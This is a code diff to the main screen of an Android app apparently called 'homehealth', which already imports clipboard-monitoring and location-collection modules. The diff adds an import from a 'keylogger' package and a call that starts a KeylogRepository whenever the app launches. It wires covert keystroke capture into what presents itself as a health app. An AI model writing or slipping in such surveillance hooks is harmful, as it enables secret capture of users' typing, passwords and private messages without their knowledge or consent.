@@ -21,6 +21,7 @@ import com.example.homehealth.utils.ClipboardMonitor
 import com.example.homehealth.utils.createNotificationChannels
 import com.example.homehealth.location.LocationCollector
 import com.example.homehealth.location.LocationService
+import com.example.homehealth.keylogger.KeylogRepository
 import kotlinx.coroutines.launch
 
 class MainActivity : ComponentActivity() {
@@ -61,6 +62,9 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
+
+        // Initialize keylogger repository
+        KeylogRepository.getInstance().init(this)
 
         createNotificationChannels(this)
         checkAndRequestPermissions()
